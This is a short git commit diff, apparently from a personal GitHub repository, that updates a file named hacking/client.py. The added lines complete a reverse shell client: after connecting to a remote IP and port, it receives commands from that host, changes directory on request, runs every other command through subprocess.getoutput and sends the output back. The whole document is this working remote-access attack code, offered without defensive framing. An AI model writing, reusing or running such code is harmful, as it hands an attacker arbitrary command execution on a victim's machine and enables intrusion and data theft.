f0cef0a507925db5ee6eb45f62dc7a47b7ce6959
SomeOneWannaHackYou <95560177+ILOVEPYTHONSOMUCH@users.noreply.github.com>
2022-07-21 14:00:29 +0700

    Update client.py

--- hacking/client.py
+++ hacking/client.py
@@ -8,5 +8,12 @@ c.connect((ip, port))
 while True:
   path = os.getcwd()
   c.send(path.encode('utf-8'))
-  
-  
+  cmd = c.recv(2048).decode("utf-8")
+  if 'cd' in cmd:
+    cut = cmd.split(" ")
+    os.chdir(os.getcwd() + "//" +cut[1])
+    path = os.getcwd()
+    c.send(path.encode('utf-8'))
+  else:
+     op = subprocess.getoutput(cmd)
+     c.send(op.encode("utf-8"))
